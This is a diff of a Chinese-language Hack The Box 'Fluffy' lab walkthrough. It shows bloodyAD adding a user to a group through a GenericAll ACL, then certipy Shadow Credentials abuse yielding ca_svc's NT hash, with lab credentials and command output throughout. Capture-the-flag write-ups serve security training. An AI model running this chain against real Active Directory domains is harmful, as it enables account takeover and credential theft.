@@ -239,13 +239,15 @@ Winrm_SVC和ldap_SVC
 首先，应该使用GenericAll ACL将我们自己添加到服务帐户中组。
 为此，让我们使用bloodyAD。
 ```
+#### 注： 从bloodyAD的下载开始要进入root执行命令
 ```
 sudo apt install pipx -y
 pipx ensurepath
 pipx uninstall bloodyAD
 pipx install bloodyAD
 
-[★]$ pipx install --force bloodyAD
+[★]$ sudo su
+# pipx install --force bloodyAD
 Installing to existing venv 'bloodyad'
   installed package bloodyad 2.5.2, installed using Python 3.11.2
   These apps are now globally available
@@ -254,32 +256,32 @@ Installing to existing venv 'bloodyad'
 done! ✨ 🌟 ✨
 ```
 ```
-[★]$ bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.56.0 add groupMember 'service accounts' p.agila
+# bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.56.0 add groupMember 'service accounts' p.agila
 [+] p.agila added to service accounts
-
-现在的状态是：
-
-✅ p.agila ∈ service accounts
-
-✅ service accounts 对以下账户有 GenericWrite
-
-winrm_svc
-
-ca_svc
-
-GenericWrite ≠ 直接读密码
-但 GenericWrite = 可以写 KeyCredentialLink（Shadow Credentials）
 ```
+#### 利用 GenericWrite → 写入 msDS-KeyCredentialLink → 伪造身份 → 再用其他方式拿 NT/RC4 hash
 #### 然后，作为服务帐户组的成员，应该使用GenericWrite ACL进行添加将影子凭证发送给winrm_svc和ca_svc用户，以检索他们的RC4密码哈希值。为此，我们可以使用证书。
 ```
-[★]$ certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
+#sudo ntpdate 10.129.56.220
+2026-01-08 11:03:57.607992 (-0600) +25199.991565 +/- 0.004602 10.129.56.220 s1 no-leap
+CLOCK: time stepped by 25199.991565
+#certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Targeting user 'ca_svc'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '3b4b5299-7fdd-da67-b884-7e5a5af89b61'
-[*] Adding Key Credential with device ID '3b4b5299-7fdd-da67-b884-7e5a5af89b61' to the Key Credentials for 'ca_svc'
-[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+[*] Key Credential generated with DeviceID 'c5a2caf4-7abe-df29-4402-a6a609f20574'
+[*] Adding Key Credential with device ID 'c5a2caf4-7abe-df29-4402-a6a609f20574' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'c5a2caf4-7abe-df29-4402-a6a609f20574' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@fluffy.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
 ```
